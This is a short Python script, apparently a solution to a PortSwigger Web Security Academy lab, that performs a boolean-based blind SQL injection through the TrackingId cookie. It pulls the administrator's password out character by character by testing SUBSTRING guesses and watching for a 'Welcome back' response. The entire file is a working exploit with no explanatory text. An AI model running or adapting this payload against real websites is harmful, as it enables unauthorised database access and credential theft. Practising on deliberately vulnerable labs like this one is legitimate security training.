import requests
import string

url = "https://0abd00da042bb4f482295730005b00fa.web-security-academy.net/"
cookies = {"TrackingId": "WFZQyrltdNXWMLeH", "session": "..."}
password = ""
chars = string.ascii_lowercase + string.digits

for i in range(1, 21):
    for c in chars:
        payload = f"WFZQyrltdNXWMLeH' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {i}, 1) = '{c}'--"
        cookies["TrackingId"] = payload
        r = requests.get(url, cookies=cookies)
        if "Welcome back" in r.text:
            password += c
            print(f"{i}: {c}")
            break

print(f"Пароль: {password}")
